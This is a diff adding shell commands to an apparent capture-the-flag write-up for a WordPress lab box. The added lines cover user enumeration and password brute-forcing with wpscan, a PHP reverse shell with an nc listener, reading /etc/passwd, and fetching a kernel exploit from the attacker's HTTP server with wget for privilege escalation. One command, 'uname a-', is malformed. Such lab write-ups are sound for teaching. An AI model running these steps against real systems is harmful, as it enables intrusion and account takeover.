@@ -53,6 +53,8 @@ Hence, we need to add the entry in /etc/hosts file as shown in the image below. 
 
 **Step 4: Run wpscan**
 
+> wpscan --url http://<IP_address_of_your_machine> --enumerate u
+
 ![Screenshot](6.png)
 
 ![Screenshot](7.png)
@@ -60,6 +62,8 @@ Hence, we need to add the entry in /etc/hosts file as shown in the image below. 
 From the scan we get to know the username `loly` , let's bruteforce it with wpscan.
 
 **Step 5: Bruteforce the password**
+
+> wpscan --url http://<IP_address_of_your_machine> -U loly -P /usr/share/wordlists/rockyou.txt
 
 ![Screenshot](8.png)
 
@@ -69,9 +73,14 @@ We successfully got the password for the username. Let's login with the credenti
 
 **Step 6: Login to wp-login**
 
+In your browser
+> http://<IP_address_of_your_machine>/wp-login
+
 ![Screenshot](10.png)
 
 **Step 7: Exploiting**
+
+Get the php reverse shell from [here](https://github.com/pentestmonkey/php-reverse-shell)
 
 ![Screenshot](11.png)
 
@@ -81,11 +90,15 @@ Uploading a php reverse shell but it's in zip format as the admin panel accepts 
 
 Start listening to the mentioned port and then open the shell in the browser
 
+> nc -lvp 1234
+
 ![Screenshot](13.png)
 
 ![Screenshot](12.png)
 
 After getting the shell, trying to get shell from python one-liner to get a clear picture.
+
+> python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 ![Screenshot](14.png)
 
@@ -95,6 +108,8 @@ From the `wp-config.php` file we got the password `lolyisabeautifulgirl`
 
 Trying to get to know whom this password belongs to.
 
+> cat /etc/passwd
+
 ![Screenshot](16.png)
 
 Looks like it belongs to `loly`.
@@ -103,17 +118,31 @@ Looks like it belongs to `loly`.
 
 Login to `loly`.
 
-The lsb_release command displays LSB (Linux Standard Base) information about specific Linux distribution, including version number, release codename, and distributor ID.
+> su loly
+Type `lolyisabeautifulgirl` for password
 
-Next, we will run the uname command to know about the Linux kernel version and some other information so we should have enough evidence about the system for Privilege Escalation.
+> lsb_release -a
+
+The `lsb_release` command displays LSB (Linux Standard Base) information about specific Linux distribution, including version number, release codename, and distributor ID.
+
+> uname a-
+Next, we will run the `uname` command to know about the Linux kernel version and some other information so we should have enough evidence about the system for Privilege Escalation.
 
 ![Screenshot](17.png)
 
 Now we know that Ubuntu 4.4.0 is running on the victim's machine. Let's try to find out the exploit related to this version.
 
+> searchsploit ubuntu 4.4.0
+
+> searchsploit -m 45010
+
 ![Screenshot](18.png)
 
+> python -m SimpleHTTPServer
+
 There is an exploit related to that version and we can use that.  We have to copy the exploit to the victim's machine for that we are using the python simple http server.
+
+> wget http://<your_machine_ip>:8000/45010.c
 
 In the reverse shell we obtained, we'll download the exploit file and compile it and we will use the `chmod` command to make the file readable, writable, and executable.
 
